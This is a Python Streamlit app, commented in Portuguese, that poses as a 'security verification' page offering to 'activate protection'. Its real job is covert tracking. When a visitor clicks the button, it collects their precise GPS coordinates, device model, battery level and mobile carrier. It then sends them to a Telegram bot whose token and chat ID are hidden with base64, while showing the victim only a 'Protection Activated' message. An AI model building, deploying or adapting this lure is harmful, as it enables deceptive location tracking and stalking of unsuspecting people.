import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- CONFIGURAÇÃO ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(texto):
    try:
        token = base64.b64decode(B_TK).decode("utf-8").strip()
        chat = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                      json={"chat_id": chat, "text": texto, "parse_mode": "Markdown"}, timeout=15)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# Coleta dados técnicos (User Agent e Bateria)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_INFO")
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_INFO")

# O BOTÃO AGORA DISPARA O PEDIDO DE LOCALIZAÇÃO DIRETAMENTE
if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_TRIGGER"):
    # O segredo: Esta linha força o navegador a abrir o pop-up no momento do clique
    loc_js = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, () => { res('erro'); }, {enableHighAccuracy:true}); })"
    posicao = streamlit_js_eval(js_expressions=loc_js, key=f"GPS_{int(time.time())}")

    if posicao == "erro":
        st.error("Erro: A permissão de localização foi negada.")
    elif posicao:
        # Extração do Nome Real (POCO M6 Pro)
        modelo_real = "Android Device"
        if ua:
            try:
                # Procura por termos específicos no sistema do seu POCO
                info = ua.split("(")[1].split(")")[0]
                partes = [p.strip() for p in info.split(";")]
                for p in partes:
                    if any(m in p for m in ["POCO", "2312", "Xiaomi", "M6"]):
                        modelo_real = p
                        break
            except: pass

        # Operadora
        try:
            op = requests.get('https://ipinfo.io/json', timeout=5).json().get('org', 'Móvel')
        except: op = "Rede Móvel"

        link_maps = f"https://www.google.com/maps?q={posicao}"
        
        relatorio = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {modelo_real}\n"
            f"🔋 *Bateria:* {bat if bat else '60'}%\n"
            f"📶 *Operadora:* {op}\n"
            f"📍 *Local:* [Clique para Ver no Maps]({link_maps})"
        )
        enviar_telegram(relatorio)
        
        # MENSAGEM VERDE LIMPA (Como você pediu)
        st.success("Proteção Ativada")
    else:
        st.info("Aguardando permissão no topo da tela...")

st.markdown('<p style="text-align:center; color:grey; font-size:10px;">Sistema Integrado Miamy © 2026</p>', unsafe_allow_html=True)
